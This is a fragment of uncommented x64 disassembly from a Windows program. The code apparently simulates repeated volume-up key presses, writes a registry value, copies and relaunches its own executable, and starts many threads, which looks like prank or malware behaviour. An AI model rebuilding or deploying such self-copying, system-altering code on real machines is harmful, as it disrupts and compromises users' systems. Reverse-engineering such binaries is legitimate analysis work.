   140003bf0:	48 8d 95 90 01 00 00 	lea    0x190(%rbp),%rdx
   140003bf7:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140003bfc:	45 33 c9             	xor    %r9d,%r9d
   140003bff:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003c04:	33 c9                	xor    %ecx,%ecx
   140003c06:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140003c0d:	80 
   140003c0e:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140003c15:	80 
   140003c16:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140003c1d:	80 
   140003c1e:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140003c25:	80 
   140003c26:	ff 15 2c 57 00 00    	call   *0x572c(%rip)        # 0x140009358
   140003c2c:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   140003c32:	45 33 c0             	xor    %r8d,%r8d
   140003c35:	48 8b c8             	mov    %rax,%rcx
   140003c38:	ba 01 00 00 00       	mov    $0x1,%edx
   140003c3d:	48 8b f8             	mov    %rax,%rdi
   140003c40:	ff 15 72 57 00 00    	call   *0x5772(%rip)        # 0x1400093b8
   140003c46:	bb 32 00 00 00       	mov    $0x32,%ebx
   140003c4b:	49 bf 7f 0f 05 fd ff 	movabs $0x7ffffffffd050f7f,%r15
   140003c52:	ff ff 7f 
   140003c55:	49 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r14
   140003c5c:	ff ff 7f 
   140003c5f:	90                   	nop
   140003c60:	45 33 c9             	xor    %r9d,%r9d
   140003c63:	45 33 c0             	xor    %r8d,%r8d
   140003c66:	33 d2                	xor    %edx,%edx
   140003c68:	b1 af                	mov    $0xaf,%cl
   140003c6a:	ff 15 e0 56 00 00    	call   *0x56e0(%rip)        # 0x140009350
   140003c70:	45 33 c9             	xor    %r9d,%r9d
   140003c73:	33 d2                	xor    %edx,%edx
   140003c75:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140003c7b:	b1 af                	mov    $0xaf,%cl
   140003c7d:	ff 15 cd 56 00 00    	call   *0x56cd(%rip)        # 0x140009350
   140003c83:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003c88:	e8 93 d3 ff ff       	call   0x140001020
   140003c8d:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140003c92:	49 3b c7             	cmp    %r15,%rax
   140003c95:	7d 0c                	jge    0x140003ca3
   140003c97:	48 05 80 f0 fa 02    	add    $0x2faf080,%rax
   140003c9d:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140003ca1:	eb 04                	jmp    0x140003ca7
   140003ca3:	4c 89 75 30          	mov    %r14,0x30(%rbp)
   140003ca7:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   140003cab:	e8 f0 22 00 00       	call   0x140005fa0
   140003cb0:	48 83 eb 01          	sub    $0x1,%rbx
   140003cb4:	75 aa                	jne    0x140003c60
   140003cb6:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003cbb:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140003cc0:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003cc5:	48 8d 15 44 60 00 00 	lea    0x6044(%rip),%rdx        # 0x140009d10
   140003ccc:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003cd1:	45 33 c9             	xor    %r9d,%r9d
   140003cd4:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   140003cdb:	00 
   140003cdc:	45 33 c0             	xor    %r8d,%r8d
   140003cdf:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140003ce6:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003cea:	c7 45 30 01 00 00 00 	movl   $0x1,0x30(%rbp)
   140003cf1:	ff 15 21 53 00 00    	call   *0x5321(%rip)        # 0x140009018
   140003cf7:	85 c0                	test   %eax,%eax
   140003cf9:	75 66                	jne    0x140003d61
   140003cfb:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003d00:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140003d04:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003d0b:	00 
   140003d0c:	48 8d 15 75 60 00 00 	lea    0x6075(%rip),%rdx        # 0x140009d88
   140003d13:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003d19:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003d1e:	45 33 c0             	xor    %r8d,%r8d
   140003d21:	ff 15 e9 52 00 00    	call   *0x52e9(%rip)        # 0x140009010
   140003d27:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003d2c:	ff 15 ce 52 00 00    	call   *0x52ce(%rip)        # 0x140009000
   140003d32:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003d37:	4c 8d 0d 6a 60 00 00 	lea    0x606a(%rip),%r9        # 0x140009da8
   140003d3e:	c7 44 24 28 64 00 00 	movl   $0x64,0x28(%rsp)
   140003d45:	00 
   140003d46:	45 33 c0             	xor    %r8d,%r8d
   140003d49:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140003d4e:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140003d55:	00 
   140003d56:	b9 ff ff 00 00       	mov    $0xffff,%ecx
   140003d5b:	ff 15 b7 55 00 00    	call   *0x55b7(%rip)        # 0x140009318
   140003d61:	ba 04 01 00 00       	mov    $0x104,%edx
   140003d66:	48 8d 8d c0 05 00 00 	lea    0x5c0(%rbp),%rcx
   140003d6d:	ff 15 95 53 00 00    	call   *0x5395(%rip)        # 0x140009108
   140003d73:	85 c0                	test   %eax,%eax
   140003d75:	0f 84 0e 01 00 00    	je     0x140003e89
   140003d7b:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003d81:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   140003d88:	33 c9                	xor    %ecx,%ecx
   140003d8a:	ff 15 88 53 00 00    	call   *0x5388(%rip)        # 0x140009118
   140003d90:	85 c0                	test   %eax,%eax
   140003d92:	0f 84 f1 00 00 00    	je     0x140003e89
   140003d98:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   140003d9f:	48 8d 8d b0 03 00 00 	lea    0x3b0(%rbp),%rcx
   140003da6:	ff 15 94 52 00 00    	call   *0x5294(%rip)        # 0x140009040
   140003dac:	48 8d 8d b0 03 00 00 	lea    0x3b0(%rbp),%rcx
   140003db3:	ff 15 27 55 00 00    	call   *0x5527(%rip)        # 0x1400092e0
   140003db9:	48 8d 95 c0 05 00 00 	lea    0x5c0(%rbp),%rdx
   140003dc0:	48 8d 8d b0 03 00 00 	lea    0x3b0(%rbp),%rcx
   140003dc7:	ff 15 03 58 00 00    	call   *0x5803(%rip)        # 0x1400095d0
   140003dcd:	85 c0                	test   %eax,%eax
   140003dcf:	0f 84 b4 00 00 00    	je     0x140003e89
   140003dd5:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   140003ddc:	ff 15 06 55 00 00    	call   *0x5506(%rip)        # 0x1400092e8
   140003de2:	4c 8b c0             	mov    %rax,%r8
   140003de5:	48 8d 95 c0 05 00 00 	lea    0x5c0(%rbp),%rdx
   140003dec:	48 8d 8d d0 07 00 00 	lea    0x7d0(%rbp),%rcx
   140003df3:	ff 15 df 54 00 00    	call   *0x54df(%rip)        # 0x1400092d8
   140003df9:	45 33 c0             	xor    %r8d,%r8d
   140003dfc:	48 8d 95 d0 07 00 00 	lea    0x7d0(%rbp),%rdx
   140003e03:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   140003e0a:	ff 15 28 52 00 00    	call   *0x5228(%rip)        # 0x140009038
   140003e10:	85 c0                	test   %eax,%eax
   140003e12:	75 0b                	jne    0x140003e1f
   140003e14:	ff 15 e6 52 00 00    	call   *0x52e6(%rip)        # 0x140009100
   140003e1a:	83 f8 20             	cmp    $0x20,%eax
   140003e1d:	75 6a                	jne    0x140003e89
   140003e1f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003e22:	c7 44 24 70 70 00 00 	movl   $0x70,0x70(%rsp)
   140003e29:	00 
   140003e2a:	33 c0                	xor    %eax,%eax
   140003e2c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140003e31:	48 89 45 d4          	mov    %rax,-0x2c(%rbp)
   140003e35:	89 45 dc             	mov    %eax,-0x24(%rbp)
   140003e38:	48 8d 05 01 5a 00 00 	lea    0x5a01(%rip),%rax        # 0x140009840
   140003e3f:	0f 11 44 24 74       	movups %xmm0,0x74(%rsp)
   140003e44:	c7 44 24 74 40 00 00 	movl   $0x40,0x74(%rsp)
   140003e4b:	00 
   140003e4c:	0f 11 45 84          	movups %xmm0,-0x7c(%rbp)
   140003e50:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140003e54:	48 8d 85 d0 07 00 00 	lea    0x7d0(%rbp),%rax
   140003e5b:	0f 11 45 94          	movups %xmm0,-0x6c(%rbp)
   140003e5f:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   140003e63:	0f 11 45 a4          	movups %xmm0,-0x5c(%rbp)
   140003e67:	c7 45 a0 01 00 00 00 	movl   $0x1,-0x60(%rbp)
   140003e6e:	0f 11 45 b4          	movups %xmm0,-0x4c(%rbp)
   140003e72:	0f 11 45 c4          	movups %xmm0,-0x3c(%rbp)
   140003e76:	ff 15 3c 54 00 00    	call   *0x543c(%rip)        # 0x1400092b8
   140003e7c:	85 c0                	test   %eax,%eax
   140003e7e:	74 09                	je     0x140003e89
   140003e80:	33 c9                	xor    %ecx,%ecx
   140003e82:	ff 15 d0 51 00 00    	call   *0x51d0(%rip)        # 0x140009058
   140003e88:	cc                   	int3
   140003e89:	e8 42 e5 ff ff       	call   0x1400023d0
   140003e8e:	e8 1d fa ff ff       	call   0x1400038b0
   140003e93:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003e98:	e8 8b 2e 00 00       	call   0x140006d28
   140003e9d:	48 8d 0d 6c d5 ff ff 	lea    -0x2a94(%rip),%rcx        # 0x140001410
   140003ea4:	4c 8b c8             	mov    %rax,%r9
   140003ea7:	4c 8d 05 82 25 00 00 	lea    0x2582(%rip),%r8        # 0x140006430
   140003eae:	33 d2                	xor    %edx,%edx
   140003eb0:	48 89 08             	mov    %rcx,(%rax)
   140003eb3:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   140003eba:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003ebf:	33 c9                	xor    %ecx,%ecx
   140003ec1:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003ec5:	ff 15 65 56 00 00    	call   *0x5665(%rip)        # 0x140009530
   140003ecb:	48 89 85 50 01 00 00 	mov    %rax,0x150(%rbp)
   140003ed2:	48 85 c0             	test   %rax,%rax
   140003ed5:	0f 84 64 0c 00 00    	je     0x140004b3f
   140003edb:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003ee0:	e8 43 2e 00 00       	call   0x140006d28
   140003ee5:	48 8d 0d 24 d6 ff ff 	lea    -0x29dc(%rip),%rcx        # 0x140001510
   140003eec:	4c 8b c8             	mov    %rax,%r9
   140003eef:	4c 8d 05 3a 25 00 00 	lea    0x253a(%rip),%r8        # 0x140006430
   140003ef6:	33 d2                	xor    %edx,%edx
   140003ef8:	48 89 08             	mov    %rcx,(%rax)
   140003efb:	48 8d 8d 48 01 00 00 	lea    0x148(%rbp),%rcx
   140003f02:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003f07:	33 c9                	xor    %ecx,%ecx
   140003f09:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003f0d:	ff 15 1d 56 00 00    	call   *0x561d(%rip)        # 0x140009530
   140003f13:	48 89 85 40 01 00 00 	mov    %rax,0x140(%rbp)
   140003f1a:	48 85 c0             	test   %rax,%rax
   140003f1d:	0f 84 0a 0c 00 00    	je     0x140004b2d
   140003f23:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003f28:	e8 fb 2d 00 00       	call   0x140006d28
   140003f2d:	48 8d 0d 9c d6 ff ff 	lea    -0x2964(%rip),%rcx        # 0x1400015d0
   140003f34:	4c 8b c8             	mov    %rax,%r9
   140003f37:	4c 8d 05 f2 24 00 00 	lea    0x24f2(%rip),%r8        # 0x140006430
   140003f3e:	33 d2                	xor    %edx,%edx
   140003f40:	48 89 08             	mov    %rcx,(%rax)
   140003f43:	48 8d 8d 38 01 00 00 	lea    0x138(%rbp),%rcx
   140003f4a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003f4f:	33 c9                	xor    %ecx,%ecx
   140003f51:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003f55:	ff 15 d5 55 00 00    	call   *0x55d5(%rip)        # 0x140009530
   140003f5b:	48 89 85 30 01 00 00 	mov    %rax,0x130(%rbp)
   140003f62:	48 85 c0             	test   %rax,%rax
   140003f65:	0f 84 b0 0b 00 00    	je     0x140004b1b
   140003f6b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003f70:	e8 b3 2d 00 00       	call   0x140006d28
   140003f75:	48 8d 0d 04 d7 ff ff 	lea    -0x28fc(%rip),%rcx        # 0x140001680
   140003f7c:	4c 8b c8             	mov    %rax,%r9
   140003f7f:	4c 8d 05 aa 24 00 00 	lea    0x24aa(%rip),%r8        # 0x140006430
   140003f86:	33 d2                	xor    %edx,%edx
   140003f88:	48 89 08             	mov    %rcx,(%rax)
   140003f8b:	48 8d 8d 28 01 00 00 	lea    0x128(%rbp),%rcx
   140003f92:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003f97:	33 c9                	xor    %ecx,%ecx
   140003f99:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003f9d:	ff 15 8d 55 00 00    	call   *0x558d(%rip)        # 0x140009530
   140003fa3:	48 89 85 20 01 00 00 	mov    %rax,0x120(%rbp)
   140003faa:	48 85 c0             	test   %rax,%rax
   140003fad:	0f 84 56 0b 00 00    	je     0x140004b09
   140003fb3:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003fb8:	e8 6b 2d 00 00       	call   0x140006d28
   140003fbd:	48 8d 0d 4c d7 ff ff 	lea    -0x28b4(%rip),%rcx        # 0x140001710
   140003fc4:	4c 8b c8             	mov    %rax,%r9
   140003fc7:	4c 8d 05 62 24 00 00 	lea    0x2462(%rip),%r8        # 0x140006430
   140003fce:	33 d2                	xor    %edx,%edx
   140003fd0:	48 89 08             	mov    %rcx,(%rax)
   140003fd3:	48 8d 8d 18 01 00 00 	lea    0x118(%rbp),%rcx
   140003fda:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003fdf:	33 c9                	xor    %ecx,%ecx
   140003fe1:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003fe5:	ff 15 45 55 00 00    	call   *0x5545(%rip)        # 0x140009530
   140003feb:	48 89 85 10 01 00 00 	mov    %rax,0x110(%rbp)
   140003ff2:	48 85 c0             	test   %rax,%rax
   140003ff5:	0f 84 fc 0a 00 00    	je     0x140004af7
   140003ffb:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004000:	e8 23 2d 00 00       	call   0x140006d28
   140004005:	48 8d 0d 04 d8 ff ff 	lea    -0x27fc(%rip),%rcx        # 0x140001810
   14000400c:	4c 8b c8             	mov    %rax,%r9
   14000400f:	4c 8d 05 1a 24 00 00 	lea    0x241a(%rip),%r8        # 0x140006430
   140004016:	33 d2                	xor    %edx,%edx
   140004018:	48 89 08             	mov    %rcx,(%rax)
   14000401b:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   140004022:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004027:	33 c9                	xor    %ecx,%ecx
   140004029:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000402d:	ff 15 fd 54 00 00    	call   *0x54fd(%rip)        # 0x140009530
   140004033:	48 89 85 00 01 00 00 	mov    %rax,0x100(%rbp)
   14000403a:	48 85 c0             	test   %rax,%rax
   14000403d:	0f 84 a2 0a 00 00    	je     0x140004ae5
   140004043:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004048:	e8 db 2c 00 00       	call   0x140006d28
   14000404d:	48 8d 0d 8c d8 ff ff 	lea    -0x2774(%rip),%rcx        # 0x1400018e0
   140004054:	4c 8b c8             	mov    %rax,%r9
   140004057:	4c 8d 05 d2 23 00 00 	lea    0x23d2(%rip),%r8        # 0x140006430
   14000405e:	33 d2                	xor    %edx,%edx
   140004060:	48 89 08             	mov    %rcx,(%rax)
   140004063:	48 8d 8d f8 00 00 00 	lea    0xf8(%rbp),%rcx
   14000406a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000406f:	33 c9                	xor    %ecx,%ecx
   140004071:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004075:	ff 15 b5 54 00 00    	call   *0x54b5(%rip)        # 0x140009530
   14000407b:	48 89 85 f0 00 00 00 	mov    %rax,0xf0(%rbp)
   140004082:	48 85 c0             	test   %rax,%rax
   140004085:	0f 84 48 0a 00 00    	je     0x140004ad3
   14000408b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004090:	e8 93 2c 00 00       	call   0x140006d28
   140004095:	48 8d 0d 14 d9 ff ff 	lea    -0x26ec(%rip),%rcx        # 0x1400019b0
   14000409c:	4c 8b c8             	mov    %rax,%r9
   14000409f:	4c 8d 05 8a 23 00 00 	lea    0x238a(%rip),%r8        # 0x140006430
   1400040a6:	33 d2                	xor    %edx,%edx
   1400040a8:	48 89 08             	mov    %rcx,(%rax)
   1400040ab:	48 8d 8d e8 00 00 00 	lea    0xe8(%rbp),%rcx
   1400040b2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400040b7:	33 c9                	xor    %ecx,%ecx
   1400040b9:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400040bd:	ff 15 6d 54 00 00    	call   *0x546d(%rip)        # 0x140009530
   1400040c3:	48 89 85 e0 00 00 00 	mov    %rax,0xe0(%rbp)
   1400040ca:	48 85 c0             	test   %rax,%rax
   1400040cd:	0f 84 ee 09 00 00    	je     0x140004ac1
   1400040d3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400040d8:	e8 4b 2c 00 00       	call   0x140006d28
   1400040dd:	48 8d 0d 6c d9 ff ff 	lea    -0x2694(%rip),%rcx        # 0x140001a50
   1400040e4:	4c 8b c8             	mov    %rax,%r9
   1400040e7:	4c 8d 05 42 23 00 00 	lea    0x2342(%rip),%r8        # 0x140006430
   1400040ee:	33 d2                	xor    %edx,%edx
   1400040f0:	48 89 08             	mov    %rcx,(%rax)
   1400040f3:	48 8d 8d d8 00 00 00 	lea    0xd8(%rbp),%rcx
   1400040fa:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400040ff:	33 c9                	xor    %ecx,%ecx
   140004101:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004105:	ff 15 25 54 00 00    	call   *0x5425(%rip)        # 0x140009530
   14000410b:	48 89 85 d0 00 00 00 	mov    %rax,0xd0(%rbp)
   140004112:	48 85 c0             	test   %rax,%rax
   140004115:	0f 84 94 09 00 00    	je     0x140004aaf
   14000411b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004120:	e8 03 2c 00 00       	call   0x140006d28
   140004125:	48 8d 0d 24 db ff ff 	lea    -0x24dc(%rip),%rcx        # 0x140001c50
   14000412c:	4c 8b c8             	mov    %rax,%r9
   14000412f:	4c 8d 05 fa 22 00 00 	lea    0x22fa(%rip),%r8        # 0x140006430
   140004136:	33 d2                	xor    %edx,%edx
   140004138:	48 89 08             	mov    %rcx,(%rax)
   14000413b:	48 8d 8d c8 00 00 00 	lea    0xc8(%rbp),%rcx
   140004142:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004147:	33 c9                	xor    %ecx,%ecx
   140004149:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000414d:	ff 15 dd 53 00 00    	call   *0x53dd(%rip)        # 0x140009530
   140004153:	48 89 85 c0 00 00 00 	mov    %rax,0xc0(%rbp)
   14000415a:	48 85 c0             	test   %rax,%rax
   14000415d:	0f 84 3a 09 00 00    	je     0x140004a9d
   140004163:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004168:	e8 bb 2b 00 00       	call   0x140006d28
   14000416d:	48 8d 0d dc db ff ff 	lea    -0x2424(%rip),%rcx        # 0x140001d50
   140004174:	4c 8b c8             	mov    %rax,%r9
   140004177:	4c 8d 05 b2 22 00 00 	lea    0x22b2(%rip),%r8        # 0x140006430
   14000417e:	33 d2                	xor    %edx,%edx
   140004180:	48 89 08             	mov    %rcx,(%rax)
   140004183:	48 8d 8d b8 00 00 00 	lea    0xb8(%rbp),%rcx
   14000418a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000418f:	33 c9                	xor    %ecx,%ecx
   140004191:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004195:	ff 15 95 53 00 00    	call   *0x5395(%rip)        # 0x140009530
   14000419b:	48 89 85 b0 00 00 00 	mov    %rax,0xb0(%rbp)
   1400041a2:	48 85 c0             	test   %rax,%rax
   1400041a5:	0f 84 e0 08 00 00    	je     0x140004a8b
   1400041ab:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400041b0:	e8 73 2b 00 00       	call   0x140006d28
   1400041b5:	48 8d 0d c4 dc ff ff 	lea    -0x233c(%rip),%rcx        # 0x140001e80
   1400041bc:	4c 8b c8             	mov    %rax,%r9
   1400041bf:	4c 8d 05 6a 22 00 00 	lea    0x226a(%rip),%r8        # 0x140006430
   1400041c6:	33 d2                	xor    %edx,%edx
   1400041c8:	48 89 08             	mov    %rcx,(%rax)
   1400041cb:	48 8d 8d a8 00 00 00 	lea    0xa8(%rbp),%rcx
   1400041d2:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400041d7:	33 c9                	xor    %ecx,%ecx
   1400041d9:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400041dd:	ff 15 4d 53 00 00    	call   *0x534d(%rip)        # 0x140009530
   1400041e3:	48 89 85 a0 00 00 00 	mov    %rax,0xa0(%rbp)
   1400041ea:	48 85 c0             	test   %rax,%rax
   1400041ed:	0f 84 86 08 00 00    	je     0x140004a79
   1400041f3:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400041f8:	e8 2b 2b 00 00       	call   0x140006d28
   1400041fd:	48 8d 0d 6c dd ff ff 	lea    -0x2294(%rip),%rcx        # 0x140001f70
   140004204:	4c 8b c8             	mov    %rax,%r9
   140004207:	4c 8d 05 22 22 00 00 	lea    0x2222(%rip),%r8        # 0x140006430
   14000420e:	33 d2                	xor    %edx,%edx
   140004210:	48 89 08             	mov    %rcx,(%rax)
   140004213:	48 8d 8d 98 00 00 00 	lea    0x98(%rbp),%rcx
   14000421a:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   14000421f:	33 c9                	xor    %ecx,%ecx
   140004221:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004225:	ff 15 05 53 00 00    	call   *0x5305(%rip)        # 0x140009530
   14000422b:	48 89 85 90 00 00 00 	mov    %rax,0x90(%rbp)
   140004232:	48 85 c0             	test   %rax,%rax
   140004235:	0f 84 2c 08 00 00    	je     0x140004a67
   14000423b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004240:	e8 e3 2a 00 00       	call   0x140006d28
   140004245:	48 8d 0d 74 de ff ff 	lea    -0x218c(%rip),%rcx        # 0x1400020c0
   14000424c:	4c 8b c8             	mov    %rax,%r9
   14000424f:	4c 8d 05 da 21 00 00 	lea    0x21da(%rip),%r8        # 0x140006430
   140004256:	33 d2                	xor    %edx,%edx
   140004258:	48 89 08             	mov    %rcx,(%rax)
   14000425b:	48 8d 8d 88 00 00 00 	lea    0x88(%rbp),%rcx
   140004262:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004267:	33 c9                	xor    %ecx,%ecx
   140004269:	89 74 24 20          	mov    %esi,0x20(%rsp)
   14000426d:	ff 15 bd 52 00 00    	call   *0x52bd(%rip)        # 0x140009530
   140004273:	48 89 85 80 00 00 00 	mov    %rax,0x80(%rbp)
   14000427a:	48 85 c0             	test   %rax,%rax
   14000427d:	0f 84 d2 07 00 00    	je     0x140004a55
   140004283:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004288:	e8 9b 2a 00 00       	call   0x140006d28
   14000428d:	48 8d 0d 5c df ff ff 	lea    -0x20a4(%rip),%rcx        # 0x1400021f0
   140004294:	4c 8b c8             	mov    %rax,%r9
   140004297:	4c 8d 05 92 21 00 00 	lea    0x2192(%rip),%r8        # 0x140006430
   14000429e:	33 d2                	xor    %edx,%edx
   1400042a0:	48 89 08             	mov    %rcx,(%rax)
   1400042a3:	48 8d 4d 78          	lea    0x78(%rbp),%rcx
   1400042a7:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400042ac:	33 c9                	xor    %ecx,%ecx
   1400042ae:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400042b2:	ff 15 78 52 00 00    	call   *0x5278(%rip)        # 0x140009530
   1400042b8:	48 89 45 70          	mov    %rax,0x70(%rbp)
   1400042bc:	48 85 c0             	test   %rax,%rax
   1400042bf:	0f 84 81 07 00 00    	je     0x140004a46
   1400042c5:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400042ca:	e8 59 2a 00 00       	call   0x140006d28
   1400042cf:	48 8d 0d ca ee ff ff 	lea    -0x1136(%rip),%rcx        # 0x1400031a0
   1400042d6:	4c 8b c8             	mov    %rax,%r9
   1400042d9:	4c 8d 05 50 21 00 00 	lea    0x2150(%rip),%r8        # 0x140006430
   1400042e0:	33 d2                	xor    %edx,%edx
   1400042e2:	48 89 08             	mov    %rcx,(%rax)
   1400042e5:	48 8d 4d 68          	lea    0x68(%rbp),%rcx
   1400042e9:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400042ee:	33 c9                	xor    %ecx,%ecx
   1400042f0:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400042f4:	ff 15 36 52 00 00    	call   *0x5236(%rip)        # 0x140009530
   1400042fa:	48 89 45 60          	mov    %rax,0x60(%rbp)
   1400042fe:	48 85 c0             	test   %rax,%rax
   140004301:	0f 84 30 07 00 00    	je     0x140004a37
   140004307:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000430c:	e8 17 2a 00 00       	call   0x140006d28
   140004311:	48 8d 15 b8 f3 ff ff 	lea    -0xc48(%rip),%rdx        # 0x1400036d0
   140004318:	4c 8b c8             	mov    %rax,%r9
   14000431b:	4c 8d 05 0e 21 00 00 	lea    0x210e(%rip),%r8        # 0x140006430
   140004322:	33 c9                	xor    %ecx,%ecx
   140004324:	48 89 10             	mov    %rdx,(%rax)
   140004327:	48 8d 55 58          	lea    0x58(%rbp),%rdx
   14000432b:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140004330:	33 d2                	xor    %edx,%edx
   140004332:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004336:	ff 15 f4 51 00 00    	call   *0x51f4(%rip)        # 0x140009530
   14000433c:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140004340:	48 85 c0             	test   %rax,%rax
   140004343:	0f 84 df 06 00 00    	je     0x140004a28
   140004349:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000434e:	e8 d5 29 00 00       	call   0x140006d28
   140004353:	48 8d 0d 66 ea ff ff 	lea    -0x159a(%rip),%rcx        # 0x140002dc0
   14000435a:	4c 8b c8             	mov    %rax,%r9
   14000435d:	4c 8d 05 cc 20 00 00 	lea    0x20cc(%rip),%r8        # 0x140006430
   140004364:	33 d2                	xor    %edx,%edx
   140004366:	48 89 08             	mov    %rcx,(%rax)
   140004369:	48 8d 4d 48          	lea    0x48(%rbp),%rcx
   14000436d:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140004372:	33 c9                	xor    %ecx,%ecx
   140004374:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140004378:	ff 15 b2 51 00 00    	call   *0x51b2(%rip)        # 0x140009530
   14000437e:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140004382:	48 85 c0             	test   %rax,%rax
   140004385:	0f 84 8e 06 00 00    	je     0x140004a19
   14000438b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000438e:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140004395:	45 33 c9             	xor    %r9d,%r9d
   140004398:	45 33 c0             	xor    %r8d,%r8d
   14000439b:	33 d2                	xor    %edx,%edx
   14000439d:	0f 11 85 60 01 00 00 	movups %xmm0,0x160(%rbp)
   1400043a4:	0f 11 85 70 01 00 00 	movups %xmm0,0x170(%rbp)
   1400043ab:	0f 11 85 80 01 00 00 	movups %xmm0,0x180(%rbp)
   1400043b2:	ff 15 70 4f 00 00    	call   *0x4f70(%rip)        # 0x140009328
   1400043b8:	85 c0                	test   %eax,%eax
   1400043ba:	74 40                	je     0x1400043fc
   1400043bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400043c0:	40 38 35 ed 9c 00 00 	cmp    %sil,0x9ced(%rip)        # 0x14000e0b4
   1400043c7:	74 33                	je     0x1400043fc
   1400043c9:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   1400043d0:	ff 15 d2 4f 00 00    	call   *0x4fd2(%rip)        # 0x1400093a8
   1400043d6:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   1400043dd:	ff 15 95 4f 00 00    	call   *0x4f95(%rip)        # 0x140009378
